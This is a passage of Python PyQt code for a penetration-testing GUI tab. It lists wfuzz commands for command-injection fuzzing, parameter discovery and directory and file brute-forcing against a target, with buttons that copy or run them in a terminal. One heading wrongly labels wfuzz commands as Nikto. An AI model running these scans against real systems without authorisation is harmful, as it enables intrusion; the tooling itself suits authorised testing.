        label_layout.addWidget(self.wfuzzXSS_Scan2_Copy)
        label_layout.addWidget(self.wfuzzXSS_Scan2_Run)
        label_layout.addWidget(self.wfuzzXSS_Scan2)
        self.tab2_container_layout.insertLayout(43, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzXSS_spacer1
        if hasattr(self, 'wfuzzXSS_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_spacer1)
            self.wfuzzXSS_spacer1.deleteLater()
        self.wfuzzXSS_spacer1 = QLabel()
        self.wfuzzXSS_spacer1.setFixedWidth(40)
        self.wfuzzXSS_spacer1.setFixedHeight(20)

        # wfuzzXSS_spacer & divider layout
        self.tab2_container_layout.insertWidget(44, self.wfuzzXSS_spacer1)

# wfuzzCIPD
        if hasattr(self, 'wfuzzCIPD'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD)
            self.wfuzzCIPD.deleteLater()
        self.wfuzzCIPD = QLabel("[+ Wfuzz Command Injection with Post Data]")
        self.wfuzzCIPD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(45,self.wfuzzCIPD)

        # wfuzzCIPD_Scan1
        if hasattr(self, 'wfuzzCIPD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1)
            self.wfuzzCIPD_Scan1.deleteLater()
        self.wfuzzCIPD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt -d doi=FUZZ http://{self.rhost}:{self.rport}/FUZZ")
        self.wfuzzCIPD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzCIPD_Scan1 copy button
        if hasattr(self, 'wfuzzCIPD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1_Copy)
            self.wfuzzCIPD_Scan1_Copy.deleteLater()
        self.wfuzzCIPD_Scan1_Copy = QPushButton()
        self.wfuzzCIPD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzCIPD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzCIPD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzCIPD_Scan1.text()))
        self.wfuzzCIPD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzCIPD_Scan1 run button
        if hasattr(self, 'wfuzzCIPD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1_Run)
            self.wfuzzCIPD_Scan1_Run.deleteLater()
        self.wfuzzCIPD_Scan1_Run = QPushButton()
        self.wfuzzCIPD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzCIPD_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzCIPD_Scan1.text() + "; bash"
        self.wfuzzCIPD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzCIPD_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzCIPD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzCIPD_Scan1_Copy)
        label_layout.addWidget(self.wfuzzCIPD_Scan1_Run)
        label_layout.addWidget(self.wfuzzCIPD_Scan1)
        self.tab2_container_layout.insertLayout(46, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzCIPD_spacer1
        if hasattr(self, 'wfuzzCIPD_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_spacer1)
            self.wfuzzCIPD_spacer1.deleteLater()
        self.wfuzzCIPD_spacer1 = QLabel()
        self.wfuzzCIPD_spacer1.setFixedWidth(40)
        self.wfuzzCIPD_spacer1.setFixedHeight(20)

        # wfuzzCIPD_spacer & divider layout
        self.tab2_container_layout.insertWidget(47, self.wfuzzCIPD_spacer1)

# wfuzzPE
        if hasattr(self, 'wfuzzPE'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE)
            self.wfuzzPE.deleteLater()
        self.wfuzzPE = QLabel("[+ Wfuzz Testing for Parameter Existence]")
        self.wfuzzPE.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(48,self.wfuzzPE)

        # wfuzzPE_Scan1
        if hasattr(self, 'wfuzzPE_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1)
            self.wfuzzPE_Scan1.deleteLater()
        self.wfuzzPE_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://{self.rhost}:{self.rport}/FUZZ")
        self.wfuzzPE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzPE_Scan1 copy button
        if hasattr(self, 'wfuzzPE_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1_Copy)
            self.wfuzzPE_Scan1_Copy.deleteLater()
        self.wfuzzPE_Scan1_Copy = QPushButton()
        self.wfuzzPE_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzPE_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzPE_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzPE_Scan1.text()))
        self.wfuzzPE_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzPE_Scan1 run button
        if hasattr(self, 'wfuzzPE_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1_Run)
            self.wfuzzPE_Scan1_Run.deleteLater()
        self.wfuzzPE_Scan1_Run = QPushButton()
        self.wfuzzPE_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzPE_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzPE_Scan1.text() + "; bash"
        self.wfuzzPE_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzPE_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzPE_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzPE_Scan1_Copy)
        label_layout.addWidget(self.wfuzzPE_Scan1_Run)
        label_layout.addWidget(self.wfuzzPE_Scan1)
        self.tab2_container_layout.insertLayout(49, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzPE_spacer1
        if hasattr(self, 'wfuzzPE_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_spacer1)
            self.wfuzzPE_spacer1.deleteLater()
        self.wfuzzPE_spacer1 = QLabel()
        self.wfuzzPE_spacer1.setFixedWidth(40)
        self.wfuzzPE_spacer1.setFixedHeight(20)

        # wfuzzPE_spacer & divider layout
        self.tab2_container_layout.insertWidget(50, self.wfuzzPE_spacer1)

# wfuzzAFD
        if hasattr(self, 'wfuzzAFD'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD)
            self.wfuzzAFD.deleteLater()
        self.wfuzzAFD = QLabel("[+ Wfuzz Authenticated Fuzzing Directories]")
        self.wfuzzAFD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(51,self.wfuzzAFD)

        # wfuzzAFD_Scan1
        if hasattr(self, 'wfuzzAFD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1)
            self.wfuzzAFD_Scan1.deleteLater()
        self.wfuzzAFD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -hc 404 -d \"SESSIONID=value\" \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzAFD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzAFD_Scan1 copy button
        if hasattr(self, 'wfuzzAFD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1_Copy)
            self.wfuzzAFD_Scan1_Copy.deleteLater()
        self.wfuzzAFD_Scan1_Copy = QPushButton()
        self.wfuzzAFD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzAFD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzAFD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzAFD_Scan1.text()))
        self.wfuzzAFD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFD_Scan1 run button
        if hasattr(self, 'wfuzzAFD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1_Run)
            self.wfuzzAFD_Scan1_Run.deleteLater()
        self.wfuzzAFD_Scan1_Run = QPushButton()
        self.wfuzzAFD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzAFD_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzAFD_Scan1.text() + "; bash"
        self.wfuzzAFD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzAFD_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzAFD_Scan1_Copy)
        label_layout.addWidget(self.wfuzzAFD_Scan1_Run)
        label_layout.addWidget(self.wfuzzAFD_Scan1)
        self.tab2_container_layout.insertLayout(52, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzAFD_spacer1
        if hasattr(self, 'wfuzzAFD_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_spacer1)
            self.wfuzzAFD_spacer1.deleteLater()
        self.wfuzzAFD_spacer1 = QLabel()
        self.wfuzzAFD_spacer1.setFixedWidth(40)
        self.wfuzzAFD_spacer1.setFixedHeight(20)

        # wfuzzAFD_spacer & divider layout
        self.tab2_container_layout.insertWidget(53, self.wfuzzAFD_spacer1)

# wfuzzAFF
        if hasattr(self, 'wfuzzAFF'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF)
            self.wfuzzAFF.deleteLater()
        self.wfuzzAFF = QLabel("[+ Authenticated File Fuzzing]")
        self.wfuzzAFF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(54,self.wfuzzAFF)

        # wfuzzAFF_Scan1
        if hasattr(self, 'wfuzzAFF_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1)
            self.wfuzzAFF_Scan1.deleteLater()
        self.wfuzzAFF_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -hc 404 -d \"SESSIONID=value\" \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzAFF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzAFF_Scan1 copy button
        if hasattr(self, 'wfuzzAFF_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1_Copy)
            self.wfuzzAFF_Scan1_Copy.deleteLater()
        self.wfuzzAFF_Scan1_Copy = QPushButton()
        self.wfuzzAFF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzAFF_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzAFF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzAFF_Scan1.text()))
        self.wfuzzAFF_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFF_Scan1 run button
        if hasattr(self, 'wfuzzAFF_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1_Run)
            self.wfuzzAFF_Scan1_Run.deleteLater()
        self.wfuzzAFF_Scan1_Run = QPushButton()
        self.wfuzzAFF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzAFF_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzAFF_Scan1.text() + "; bash"
        self.wfuzzAFF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzAFF_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFF_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzAFF_Scan1_Copy)
        label_layout.addWidget(self.wfuzzAFF_Scan1_Run)
        label_layout.addWidget(self.wfuzzAFF_Scan1)
        self.tab2_container_layout.insertLayout(55, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzAFF_spacer1
        if hasattr(self, 'wfuzzAFF_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_spacer1)
            self.wfuzzAFF_spacer1.deleteLater()
        self.wfuzzAFF_spacer1 = QLabel()
        self.wfuzzAFF_spacer1.setFixedWidth(40)
        self.wfuzzAFF_spacer1.setFixedHeight(20)

        # wfuzzAFF_spacer & divider layout
        self.tab2_container_layout.insertWidget(56, self.wfuzzAFF_spacer1)

# wfuzzD
        if hasattr(self, 'wfuzzD'):
            self.tab2_container_layout.removeWidget(self.wfuzzD)
            self.wfuzzD.deleteLater()
        self.wfuzzD = QLabel("[+ Wfuzz Fuzz Directories]")
        self.wfuzzD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(57,self.wfuzzD)

        # wfuzzD_Scan1
        if hasattr(self, 'wfuzzD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1)
            self.wfuzzD_Scan1.deleteLater()
        self.wfuzzD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan1 copy button
        if hasattr(self, 'wfuzzD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1_Copy)
            self.wfuzzD_Scan1_Copy.deleteLater()
        self.wfuzzD_Scan1_Copy = QPushButton()
        self.wfuzzD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan1.text()))
        self.wfuzzD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan1 run button
        if hasattr(self, 'wfuzzD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1_Run)
            self.wfuzzD_Scan1_Run.deleteLater()
        self.wfuzzD_Scan1_Run = QPushButton()
        self.wfuzzD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan1.text() + "; bash"
        self.wfuzzD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan1_Copy)
        label_layout.addWidget(self.wfuzzD_Scan1_Run)
        label_layout.addWidget(self.wfuzzD_Scan1)
        self.tab2_container_layout.insertLayout(58, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_Scan2
        if hasattr(self, 'wfuzzD_Scan2'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2)
            self.wfuzzD_Scan2.deleteLater()
        self.wfuzzD_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan2 copy button
        if hasattr(self, 'wfuzzD_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2_Copy)
            self.wfuzzD_Scan2_Copy.deleteLater()
        self.wfuzzD_Scan2_Copy = QPushButton()
        self.wfuzzD_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan2.text()))
        self.wfuzzD_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan2 run button
        if hasattr(self, 'wfuzzD_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2_Run)
            self.wfuzzD_Scan2_Run.deleteLater()
        self.wfuzzD_Scan2_Run = QPushButton()
        self.wfuzzD_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan2.text() + "; bash"
        self.wfuzzD_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan2_Copy)
        label_layout.addWidget(self.wfuzzD_Scan2_Run)
        label_layout.addWidget(self.wfuzzD_Scan2)
        self.tab2_container_layout.insertLayout(59, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_Scan3
        if hasattr(self, 'wfuzzD_Scan3'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3)
            self.wfuzzD_Scan3.deleteLater()
        self.wfuzzD_Scan3 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan3 copy button
        if hasattr(self, 'wfuzzD_Scan3_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3_Copy)
            self.wfuzzD_Scan3_Copy.deleteLater()
        self.wfuzzD_Scan3_Copy = QPushButton()
        self.wfuzzD_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan3.text()))
        self.wfuzzD_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan3 run button
        if hasattr(self, 'wfuzzD_Scan3_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3_Run)
            self.wfuzzD_Scan3_Run.deleteLater()
        self.wfuzzD_Scan3_Run = QPushButton()
        self.wfuzzD_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan3.text() + "; bash"
        self.wfuzzD_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan3_Copy)
        label_layout.addWidget(self.wfuzzD_Scan3_Run)
        label_layout.addWidget(self.wfuzzD_Scan3)
        self.tab2_container_layout.insertLayout(60, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_Scan4
        if hasattr(self, 'wfuzzD_Scan4'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4)
            self.wfuzzD_Scan4.deleteLater()
        self.wfuzzD_Scan4 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan4 copy button
        if hasattr(self, 'wfuzzD_Scan4_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4_Copy)
            self.wfuzzD_Scan4_Copy.deleteLater()
        self.wfuzzD_Scan4_Copy = QPushButton()
        self.wfuzzD_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan4.text()))
        self.wfuzzD_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan4 run button
        if hasattr(self, 'wfuzzD_Scan4_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4_Run)
            self.wfuzzD_Scan4_Run.deleteLater()
        self.wfuzzD_Scan4_Run = QPushButton()
        self.wfuzzD_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan4.text() + "; bash"
        self.wfuzzD_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan4_Copy)
        label_layout.addWidget(self.wfuzzD_Scan4_Run)
        label_layout.addWidget(self.wfuzzD_Scan4)
        self.tab2_container_layout.insertLayout(61, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_spacer1
        if hasattr(self, 'wfuzzD_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_spacer1)
            self.wfuzzD_spacer1.deleteLater()
        self.wfuzzD_spacer1 = QLabel()
        self.wfuzzD_spacer1.setFixedWidth(40)
        self.wfuzzD_spacer1.setFixedHeight(20)

        # wfuzzD_spacer & divider layout
        self.tab2_container_layout.insertWidget(62, self.wfuzzD_spacer1)

# wfuzzF
        if hasattr(self, 'wfuzzF'):
            self.tab2_container_layout.removeWidget(self.wfuzzF)
            self.wfuzzF.deleteLater()
        self.wfuzzF = QLabel("[+ Nikto with SSL and Evasion:]")
        self.wfuzzF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(63,self.wfuzzF)

        # wfuzzF_Scan1
        if hasattr(self, 'wfuzzF_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1)
            self.wfuzzF_Scan1.deleteLater()
        self.wfuzzF_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan1 copy button
        if hasattr(self, 'wfuzzF_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1_Copy)
            self.wfuzzF_Scan1_Copy.deleteLater()
        self.wfuzzF_Scan1_Copy = QPushButton()
        self.wfuzzF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan1.text()))
        self.wfuzzF_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan1 run button
        if hasattr(self, 'wfuzzF_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1_Run)
            self.wfuzzF_Scan1_Run.deleteLater()
        self.wfuzzF_Scan1_Run = QPushButton()
        self.wfuzzF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan1.text() + "; bash"
        self.wfuzzF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan1_Copy)
        label_layout.addWidget(self.wfuzzF_Scan1_Run)
        label_layout.addWidget(self.wfuzzF_Scan1)
        self.tab2_container_layout.insertLayout(64, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_Scan2
        if hasattr(self, 'wfuzzF_Scan2'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2)
            self.wfuzzF_Scan2.deleteLater()
        self.wfuzzF_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan2 copy button
        if hasattr(self, 'wfuzzF_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2_Copy)
            self.wfuzzF_Scan2_Copy.deleteLater()
        self.wfuzzF_Scan2_Copy = QPushButton()
        self.wfuzzF_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan2.text()))
        self.wfuzzF_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan2 run button
        if hasattr(self, 'wfuzzF_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan2_Run)
            self.wfuzzF_Scan2_Run.deleteLater()
        self.wfuzzF_Scan2_Run = QPushButton()
        self.wfuzzF_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan2.text() + "; bash"
        self.wfuzzF_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzF_Scan2_Copy)
        label_layout.addWidget(self.wfuzzF_Scan2_Run)
        label_layout.addWidget(self.wfuzzF_Scan2)
        self.tab2_container_layout.insertLayout(65, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzF_Scan3
        if hasattr(self, 'wfuzzF_Scan3'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3)
            self.wfuzzF_Scan3.deleteLater()
        self.wfuzzF_Scan3 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzF_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzF_Scan3 copy button
        if hasattr(self, 'wfuzzF_Scan3_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3_Copy)
            self.wfuzzF_Scan3_Copy.deleteLater()
        self.wfuzzF_Scan3_Copy = QPushButton()
        self.wfuzzF_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzF_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wfuzzF_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan3.text()))
        self.wfuzzF_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzF_Scan3 run button
        if hasattr(self, 'wfuzzF_Scan3_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan3_Run)
            self.wfuzzF_Scan3_Run.deleteLater()
        self.wfuzzF_Scan3_Run = QPushButton()
        self.wfuzzF_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzF_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzF_Scan3.text() + "; bash"
        self.wfuzzF_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzF_Scan3_Run.setStyleSheet(
